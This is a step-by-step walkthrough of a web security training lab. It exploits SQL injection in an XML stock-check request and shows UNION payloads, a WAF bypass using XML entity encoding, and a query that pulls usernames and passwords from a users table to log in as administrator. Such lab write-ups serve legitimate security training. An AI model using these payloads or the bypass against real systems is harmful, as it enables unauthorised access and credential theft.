# Lab Objective
Extract the usernames and passwords from the `users` table by:

1. Finding the SQL injection point.
2. Bypassing the WAF using XML entity encoding.
3. Determining the query structure.
4. Extracting credentials.
5. Logging in as the administrator.

# Step 1: Identify the Injection Point

Use the stock check feature.

Burp intercepts a request similar to:

```
POST /product/stock HTTP/2
Host: lab-id.web-security-academy.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

Notice that the request body is **XML**, not URL parameters.

---

# Step 2: Verify That Input Is Evaluated

Replace:

```xml
<storeId>1</storeId>
```

with

```xml
<storeId>1+1</storeId>
```

---

# Step 3: Test UNION Injection

Try:

```xml
<storeId>1 UNION SELECT NULL</storeId>
```

---

# Step 4: Bypass the WAF

In Burp:

```
**Highlight payload
        ↓
Right-click
        ↓
Extensions
        ↓
Hackvertor
        ↓
Encode
        ↓
hex_entities**
```

or

```
**dec_entities**
```

---

# Step 5: Determine the Number of Columns

Now repeat your UNION tests using the encoded payload.

Example:

```sql
1 UNION SELECT NULL
```

If it succeeds,

try:

```sql
1 UNION SELECT NULL,NULL
```

---

# 

---

# Step 6: Final Query

Conceptually, after XML entity encoding, the SQL becomes:

```sql
1 UNION SELECT username || '~' || password FROM users
```

---

# Step 7: Read the Response

The stock check response now contains values similar to:

```
administrator~password123
```

Locate the administrator row and note the password.

---

# Step 8: Log In

Go to:

```
My Account
```

Log in using:

```
Username:
administrator

Password:
password123
```

(The actual password is unique to your lab.)

The lab is solved.

---

# Complete Workflow

```
XML Request
      │
      ▼
Modify storeId
      │
      ▼
Test arithmetic
(1+1)
      │
      ▼
SQL evaluation confirmed
      │
      ▼
Attempt UNION
      │
      ▼
Blocked by WAF
      │
      ▼
Encode payload as XML entities
      │
      ▼
WAF bypass
      │
      ▼
Determine column count
      │
      ▼
One column
      │
      ▼
Concatenate username/password
      │
      ▼
Extract credentials
      │
      ▼
Log in as administrator
```

# Key Concepts

### 1. SQL Injection in XML

The application uses XML input:

```xml
<storeId>1</storeId>
```

The value is inserted into a SQL query without proper sanitization, allowing SQL injection.
